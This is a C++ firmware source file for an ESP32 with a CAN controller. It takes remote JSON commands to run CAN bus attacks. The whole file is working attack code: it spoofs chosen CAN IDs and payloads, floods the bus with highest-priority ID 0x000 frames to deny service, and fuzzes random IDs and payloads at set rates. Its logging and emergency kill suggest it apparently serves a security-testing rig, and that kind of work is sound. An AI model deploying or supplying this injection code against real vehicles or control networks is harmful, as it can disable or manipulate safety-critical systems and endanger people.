#include "attack_control.h"

bool attackRunning = false;
String currentAttackType = "";
unsigned long injectionCounter = 0;

AttackParams currentParams;

void handleStartAttack(JsonDocument &doc)
{
  const char *attackType = doc["attack_type"];
  currentAttackType = String(attackType);

  // Parse parameters
  currentParams.frequency = doc["parameters"]["frequency"];
  currentParams.intensity = doc["parameters"]["intensity"];
  currentParams.id = doc["parameters"]["id"].as<String>();
  currentParams.payload = doc["parameters"]["payload"].as<String>();

  // Optional fuzzing parameters
  if (doc["parameters"]["fuzz_mode"].is<String>())
  {
    currentParams.fuzzMode = doc["parameters"]["fuzz_mode"].as<String>();
    currentParams.minId = doc["parameters"]["min_id"].as<String>();
    currentParams.maxId = doc["parameters"]["max_id"].as<String>();
    currentParams.payloadMode = doc["parameters"]["payload_mode"].as<String>();
  }

  attackRunning = true;
  injectionCounter = 0;

  Serial.println("[Attack] Started: " + currentAttackType);
  Serial.println("[Attack] Frequency: " + String(currentParams.frequency) + " Hz");
  Serial.println("[Attack] Intensity: " + String(currentParams.intensity));

  sendLogEvent("attack_started", 0, "", currentParams.frequency);
}

void handleStopAttack()
{
  attackRunning = false;
  Serial.println("[Attack] Stopped");
  sendLogEvent("attack_stopped", 0, "", 0);
}

void handlePauseAttack()
{
  attackRunning = false;
  Serial.println("[Attack] Paused");
  sendLogEvent("attack_paused", 0, "", currentParams.frequency);
}

void handleResumeAttack()
{
  attackRunning = true;
  Serial.println("[Attack] Resumed");
  sendLogEvent("attack_resumed", 0, "", currentParams.frequency);
}

void handleEmergencyKill()
{
  attackRunning = false;
  injectionCounter = 0;
  Serial.println("[Attack] EMERGENCY KILL received!");
  sendLogEvent("emergency_kill", 0, "", 0);
}

// ==========================================
// ATTACK EXECUTION
// ==========================================
void executeAttack()
{
  if (!attackRunning)
    return;

  if (currentAttackType == "spoofing")
    executeSpoofing();
  else if (currentAttackType == "dos")
    executeDOS();
  else if (currentAttackType == "fuzzing")
    executeFuzzing();
}
void executeSpoofing()
{
  if (currentParams.frequency == 0 || currentParams.intensity == 0)
    return;
  // Calculate delay between injections (microseconds)
  unsigned long delayUs = 1000000 / currentParams.frequency;

  // Parse CAN ID from hex string
  uint32_t canId = strtol(currentParams.id.c_str(), NULL, 16);

  // Send CAN frame
  twai_message_t message = {0};
  message.identifier = canId;
  message.flags = TWAI_MSG_FLAG_NONE; // Extended ID
  message.data_length_code = 8;

  if (currentParams.payload.length() < 16)
    return;
  // Parse payload hex string to bytes
  for (int i = 0; i < 8; i++)
  {
    char buf[3];
    buf[0] = currentParams.payload[i * 2];
    buf[1] = currentParams.payload[i * 2 + 1];
    buf[2] = '\0';

    message.data[i] = strtol(buf, NULL, 16);
  }

  // Send with intensity-based delays
  uint16_t injectionDelay = delayUs / currentParams.intensity;

  if (twai_transmit(&message, 0) == ESP_OK)
  {
    injectionCounter++;

    if (injectionCounter % 100 == 0)
    {
      Serial.print("[Spoofing] Sent ");
      Serial.print(injectionCounter);
      Serial.println(" frames");
      sendLogEvent("spoofing", canId, currentParams.payload, currentParams.frequency);
    }
  }

  delayMicroseconds(injectionDelay);
}

void executeFuzzing()
{
  twai_message_t message = {0};
  message.data_length_code = 8;
  message.flags = TWAI_MSG_FLAG_NONE;

  uint32_t minId = strtol(currentParams.minId.c_str(), NULL, 16);
  uint32_t maxId = strtol(currentParams.maxId.c_str(), NULL, 16);

  // Generate random ID if needed
  if (currentParams.fuzzMode == "random_id" || currentParams.fuzzMode == "id_payload")
  {
    message.identifier = random(minId, maxId + 1);
  }
  else
  {
    message.identifier = minId;
  }

  // Generate random payload if needed
  if (currentParams.fuzzMode == "random_payload" || currentParams.fuzzMode == "id_payload")
  {
    for (int i = 0; i < 8; i++)
    {
      message.data[i] = random(0, 256);
    }
  }
  else
  {
    memset(message.data, 0, 8);
  }
  if (currentParams.frequency == 0 || currentParams.intensity == 0)
    return;

  unsigned long delayUs = 1000000 / currentParams.frequency;
  uint16_t injectionDelay = delayUs / currentParams.intensity;

  if (twai_transmit(&message, 0) == ESP_OK)
  {
    injectionCounter++;

    if (injectionCounter % 100 == 0)
    {
      char payload[17];
      sprintf(payload, "%02X%02X%02X%02X%02X%02X%02X%02X", message.data[0], message.data[1],
              message.data[2], message.data[3], message.data[4], message.data[5], message.data[6],
              message.data[7]);
      sendLogEvent("fuzzing", message.identifier, String(payload), currentParams.frequency);
    }
  }

  delayMicroseconds(injectionDelay);
}

void executeDOS()
{
  // DoS attacks use fixed ID 0x000 and high frequency
  twai_message_t message = {0};
  message.identifier = 0x000;
  message.flags = TWAI_MSG_FLAG_NONE;
  message.data_length_code = 8;

  // Fill with zeros or custom payload
  if (currentParams.payload.length() >= 16)
  {
    for (int i = 0; i < 8; i++)
    {
      char buf[3];
      buf[0] = currentParams.payload[i * 2];
      buf[1] = currentParams.payload[i * 2 + 1];
      buf[2] = '\0';

      message.data[i] = strtol(buf, NULL, 16);
    }
  }
  else
  {
    memset(message.data, 0, 8);
  }
  if (currentParams.frequency == 0 || currentParams.intensity == 0)
    return;
  unsigned long delayUs = 1000000 / currentParams.frequency;
  uint16_t injectionDelay = delayUs / currentParams.intensity;

  if (twai_transmit(&message, 0) == ESP_OK)
  {
    injectionCounter++;

    if (injectionCounter % 500 == 0)
    {
      Serial.print("[DoS] Sent ");
      Serial.print(injectionCounter);
      Serial.println(" frames");
      sendLogEvent("dos", 0x000, "", currentParams.frequency);
    }
  }

  delayMicroseconds(injectionDelay);
}